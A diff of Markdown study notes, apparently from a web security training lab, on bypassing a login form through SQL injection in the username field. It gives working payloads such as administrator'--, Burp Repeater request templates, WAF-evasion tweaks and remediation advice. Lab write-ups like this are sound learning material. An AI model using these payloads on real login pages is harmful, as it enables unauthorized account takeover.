@@ -119,51 +119,141 @@ id=1' OR 1=1-- (or id=1 OR 1=1 depending on context).
 
 ---
 
-# SQL Injection — Lab 2: Login Bypass / Subverting App Logic
+# SQL Injection Lab-2 — Subverting Application Logic (Login Bypass) — Notes 
+
+Lab type: in-band SQLi (authentication bypass via WHERE-clause manipulation / comment-out).
 
 ---
 
-## 🔹 One-line summary
-Bypass the login check by injecting a SQL comment/boolean into the username parameter (e.g. administrator'--) and gain access to the admin account.  
+## 🔹 1. What is this issue?
+
+A SQL injection in an authentication query lets an attacker manipulate the WHERE clause so the password check is never applied. By injecting a comment (e.g. --) or an always-true expression into the *username* field, the attacker can cause the query to return the target user row and the app treats them as authenticated — no password required.
 
 ---
 
-## 🔹 Overview
-A vulnerable login/account lookup concatenates user input into SQL. Injecting a comment or always-true boolean removes or bypasses the AND password = '...' check, letting the DB return the administrator row without the correct password.
+## 🔹 2. Why this matters (real-world risk)
+
+- Immediate account takeover (often admin).  
+- Full application compromise if the account has high privileges.  
+- Simple and frequently present in legacy code that concatenates inputs into SQL.  
+- Easy to chain with further attacks (data exfiltration, privilege escalation, persistence).
+
+Impact example: login as administrator → delete users / change configs / exfiltrate data.
 
 ---
 
-## 🔹 Methodology (lab walk-through)
-- Capture the login flow and find the request that looks up the account (POST /login or subsequent GET /my-account?username=...).  
-- Force the account GET to appear by submitting a POST with username=administrator (no payload) and forward it.  
-- Modify the resulting GET (or the original POST if applicable) to inject:administrator'-- // or administrator' OR '1'='1'--
-[6:19 am, 23/09/2025] ‌‌: - Send the modified GET and inspect the response for admin content (dashboard / admin UI).
+## 🔹 3. High-value places to test (quick)
+
+- Login endpoints: POST /login, /auth, /session.  
+- Any endpoint that constructs SQL from user-controlled fields w/o parameterization.  
+- API endpoints accepting username, userId, email in JSON or form data.
 
 ---
 
-## 🔹 Proof
-![SQLi login bypass — manipulated GET showing administrator'-- payload](../images/sqli-lab2-injected-get.png)  
-(Screenshot: the modified GET /my-account?username=administrator'-- captured in Burp/Repeater — shows the payload used to bypass authentication.)
+## 🔹 4. How to find it quickly
+
+- Submit a single quote ' in the username and watch for errors or different behaviour.  
+- Try common auth-bypass payloads in the username field:
+
+  - administrator'--  
+  - administrator' OR '1'='1  
+  - admin'/*  (DB/comment dependent)
+
+- Observe redirects, status codes, response bodies — successful injection often returns admin pages or different Location headers.
 
 ---
 
-## 🔹 Impact
-- Immediate account takeover (often admin) → full application access.  
-- Data exposure, modification, and potential escalation to backend compromise.
+## 🔹 5. Lab walkthrough — compact (exact steps)
+
+1. *Capture a baseline login request*  
+   - Proxy *ON*; perform a normal login to capture POST /login (username/password).  
+   - In Burp → *Proxy → HTTP history* find the POST /login and *Send to Repeater*.
+
+2. *Send to Repeater and prepare PoC*  
+   - In Repeater edit the request body (or form fields).  
+   - Replace username= value with the SQL comment payload, for example:  
+     
+     username=administrator'--&password=anything
+     
+
+3. *Leave password blank or unchanged*  
+   - You may set password= to an arbitrary value or leave it empty — the injection should remove the password check.
+
+4. *Send the modified request*  
+   - Click *Send* in Repeater and inspect raw response headers. Look for a redirect such as:
+     
+     HTTP/1.1 302 Found
+     Location: /my-account?id=administrator
+     
+
+5. *Follow the redirect / verify in browser*  
+   - Replay cookies / session in browser or follow the redirect in Repeater. If you see admin UI / account page you are authenticated as the target user. Lab solved.
+     
+---
+
+## 🧾 Proof / Evidence
+
+1. *Screenshot — PoC Repeater request/response (injected login POST)*  
+   ../images/sqli-login-bypass-post.png  
+   Description: Repeater request showing the modified POST /login (payload username=administrator'--) and the response headers (302 Location: /my-account?id=administrator).  
+   ![PoC — SQLi login bypass](../images/sqli-login-bypass-post.png)
 
 ---
 
-## 🔹 Remediation (short)
-- Use *parameterized queries / prepared statements* for all DB access (never concatenate inputs).  
-- Do not rely on client-side or URL parameters to authorize access to sensitive account pages.  
-- Enforce server-side session ownership checks for account pages.
+## 🔹 6. Repeater / PoC templates 
+
+*Form-encoded login bypass (example)*
+
+POST /login HTTP/1.1 Host: <LAB_HOST> Content-Type: application/x-www-form-urlencoded Cookie: session=<YOUR_SESSION>
+
+username=administrator'--&password=anything
+
+*GET-style (if login via querystring)*
+
+GET /login?username=administrator'--&password=anything HTTP/1.1 Host: <LAB_HOST>
+
+(Adjust method/headers to match the app. URL-encode when pasting into browser.)
 
 ---
 
-## 🔹 Pentest checklist
-- [x] Capture login/account lookup requests.  
-- [x] Test ', OR 1=1--, and comment variations in username.  
-- [x] Verify admin UI or privileged content appears.  
-- [x] Save raw request/response and include one strong screenshot (manipulated request).
+## 🔹 7. Common payloads 
+
+- administrator'--  (comment-out rest)  
+- administrator' OR '1'='1'--  
+- ' OR '1'='1'--  (may log in as first user returned)  
+- admin'/*  (DB-specific comment forms)  
+- Numeric ids: 1 OR 1=1--
+
+Always adapt to DB comment style and context (string vs numeric).
+
+---
+
+## 🔹 8. Troubleshooting
+
+- No redirect/visible change → try alternate comment styles (--, #, /* */) and URL-encode special chars.  
+- WAF blocks simple payloads → try minor obfuscation (e.g., OR/**/1=1).  
+- If query expects numeric id → remove quotes and use numeric payloads.  
+- Use Repeater to inspect raw responses (redirects, cookies) rather than relying only on browser UI.
+
+---
+
+## 🔹 9. Fixes / remediation (what to recommend)
+
+- Use parameterized queries / prepared statements for all DB access (no string concatenation).  
+- Use ORM safe-query mechanisms; never interpolate untrusted input.  
+- Return generic login error messages — avoid revealing whether username exists.  
+- Apply WAF/input validation as defense-in-depth (not a substitute for parameterized queries).  
+- Review & sanitize legacy auth code paths; add automated tests to detect auth bypass via injection.
+
+---
+
+## 🔹 10. Pentest checklist 
+
+- Affected endpoint & method: POST /login.  
+- Vulnerable parameter: username.  
+- Exact PoC request & raw response showing redirect to /my-account?id=administrator.  
+- Evidence: screenshot of admin page after bypass.  
+- Impact: authentication bypass → admin takeover.  
+- Remediation summary: parameterized queries + hardening.
 
 ---
